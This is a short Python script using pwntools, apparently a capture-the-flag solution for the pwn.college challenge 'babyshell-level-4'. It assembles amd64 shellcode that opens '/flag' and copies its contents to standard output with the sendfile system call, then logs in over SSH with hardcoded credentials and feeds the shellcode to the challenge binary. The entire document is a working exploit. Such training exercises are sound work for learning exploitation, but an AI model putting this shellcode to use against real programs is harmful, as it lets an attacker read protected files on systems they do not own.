from pwn import *

context.arch='amd64'
context.os='linux'

asm_code = """
    xor eax, eax
    mov eax, 2
    lea edi, [rip + path]
    xor esi, esi
    syscall
    xor edi, edi
    mov dil, 1
    xor esi, esi
    mov sil, al
    xor edx, edx
    mov r10, 128
    mov al, 40
    syscall
path:
    .string "/flag"
"""

shellcode=asm(asm_code)

formatted_shellcode = ''.join([f'\\x{byte:02x}' for byte in shellcode])
print(formatted_shellcode)

HOST='pwn.college'
port=22
password='password'
FILE='/challenge/babyshell-level-4'
username='hacker'
conn = ssh(user=username, host=HOST, password=password)

proc = conn.process(FILE)
proc.recvuntil("Reading 0x1000 bytes from stdin.")
proc.sendline(shellcode)
proc.interactive()

conn.close()
